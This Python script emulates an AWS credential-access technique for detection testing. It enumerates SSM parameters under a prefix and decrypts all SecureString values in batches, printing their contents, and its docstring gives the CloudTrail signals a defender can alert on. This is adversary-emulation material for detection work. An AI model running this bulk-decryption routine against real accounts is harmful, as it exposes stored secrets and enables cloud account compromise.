"""
Technique : aws.credential-access.ssm-retrieve-securestring-parameters
Tactic    : Credential Access (T1552.007)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the 42 SSM SecureString parameters.
  - AWS credentials must have ssm:DescribeParameters + ssm:GetParameters.

Detection signal:
  - ssm:GetParameters with withDecryption=true for a large number of parameters.
  - Alert on: > 10 SecureString decryptions from a single principal in a short window.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3

BATCH_SIZE = 10  # GetParameters max per call


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir    = str(Path(__file__).parent.parent / "infra")
    infra        = get_pulumi_outputs(stack_dir)
    param_prefix = infra.get("param_prefix", "/credentials/stratus-red-team")

    ssm     = session.client("ssm")

    # ── Step 1: Enumerate parameters by path ──────────────────────────────────
    banner("Step 1 — Enumerate SSM parameters (DescribeParameters)")
    paginator    = ssm.get_paginator("describe_parameters")
    param_names  = []
    for page in paginator.paginate(
        ParameterFilters=[{
            "Key":    "Name",
            "Option": "BeginsWith",
            "Values": [param_prefix],
        }]
    ):
        for p in page.get("Parameters", []):
            param_names.append(p["Name"])
            print(f"  [+] Found: {p['Name']} (Type: {p['Type']})")

    print(f"\n[*] Discovered {len(param_names)} parameters")

    if not param_names:
        print("[!] No parameters found — did you run pulumi up in ../infra/?")
        return

    # ── Step 2: Decrypt and retrieve all parameters in batches ───────────────
    banner(f"Step 2 — GetParameters with WithDecryption=true (batches of {BATCH_SIZE})")
    total_retrieved = 0
    for i in range(0, len(param_names), BATCH_SIZE):
        batch = param_names[i:i + BATCH_SIZE]
        resp  = ssm.get_parameters(Names=batch, WithDecryption=True)
        for p in resp.get("Parameters", []):
            print(f"  [+] {p['Name']} = {str(p['Value'])[:40]}")
            total_retrieved += 1
        for invalid in resp.get("InvalidParameters", []):
            print(f"  [!] Invalid: {invalid}")

    banner(f"Complete — {total_retrieved}/{len(param_names)} SecureString parameters decrypted")
    print("\nCloudTrail will show ssm:GetParameters with withDecryption=true.")
    print("Detection: >= 10 SecureString decryptions from one principal in 5 min.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
